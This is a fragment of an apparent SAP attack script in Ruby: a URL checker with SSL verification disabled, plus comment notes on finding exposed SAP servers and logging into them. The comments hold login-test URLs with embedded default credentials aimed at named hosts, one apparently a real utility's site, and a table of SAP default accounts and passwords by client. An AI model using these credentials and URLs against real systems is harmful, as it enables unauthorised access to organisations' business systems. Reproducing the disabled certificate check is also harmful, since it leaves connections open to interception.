


	def sap_urls(location)
		uri = URI.parse(location)
		http = Net::HTTP.new(uri.host, uri.port)
		http.use_ssl = true
		http.verify_mode = OpenSSL::SSL::VERIFY_NONE
		request = Net::HTTP::Get.new(uri.request_uri)
		response = http.request(request)
		
		if response.code == "200"
			return true
		else
			puts response.code
			return false
		end
	end









# 170
# http://eripp.com/?ipdb=1&search=%22SAP+Web+Application%22&sort=time&order=DESC&limit=200&exclude=yes&submitbutton=Search


# /sap/public/bc/sicf_login_run
# /sap/bc/bsp/sap/sicf_login_test/test?sap-client=000&sap-user=SAP*&sap-password=PASS&sap-language=EN&&__systemlogin_test_url=http%3A//prmucsbm.ce.corp.com%3A8042/sap/bc/bsp/sap/sicf_login_test/test%3Fsap-client%3D000%26sap-user%3DSAP*%26sap-password%3DPASS%26sap-language%3DEN%26%26
# /sap/bc/bsp/sap/sicf_login_test/test?sap-client=000&sap-user=SAPCPIC&sap-password=ADMIN&sap-language=EN&&__systemlogin_test_url=https%3A// www.consumersenergy.com/sap/bc/bsp/sap/sicf_login_test/test%3Fsap-client%3D000%26sap-user%3DSAPCPIC%26sap-password%3DADMIN%26sap-language%3DEN%26%26
# /sap/bc/bsp/sap/sicf_login_test/test?=&__systemlogin_test_url=http%3a%2f%2fprmucsbm%2ece%2ecorp%2ecom%3a8042%2fsap%2fbc%2fbsp%2fsap%2fsicf_login_test%2ftest%3fsap-client%3d000%26sap-user%3dSAP%2a%26sap-password%3dPASS%26sap-

# sap/bc/gui/sap/its/webgui

# SAP Clients 000-999 Default 000,001 and 066

# Default lockout 5

# USER 	- 		PASS 				-	CLIENTS
# SAP* 	- 		06071992 & PASS		- 	000, 001, 006
# DDIC 	- 		19920706			-	000, 001
# TMSADM -		PASSWORD, TMSADM	- 	000
# EARLYWATCH -	SUPPORT				- 	066
# SAPCPIC	-	ADMIN				-	000, 001


# DeepSec MWR Labs - SAP slapping
# BizSploit Onapsis
# Onapsis BlackHat presentations and papers
# http://blog.c22.cc
# http://erpscan.ru/wp-content/uploads/2011/08/A-crushing-blow-at-the-heart-SAP-J2EE-engine_whitepaper.pdf


#/sap/bc/gui/sap/its/webgui?sap-client=100&&sap-user=SAPCPIC&sap-password=ADMIN&sap-language=EN

# TMSADM -		PASSWORD, TMSADM 

# /sap/bc/webdynpro/sap/apb_launchpad

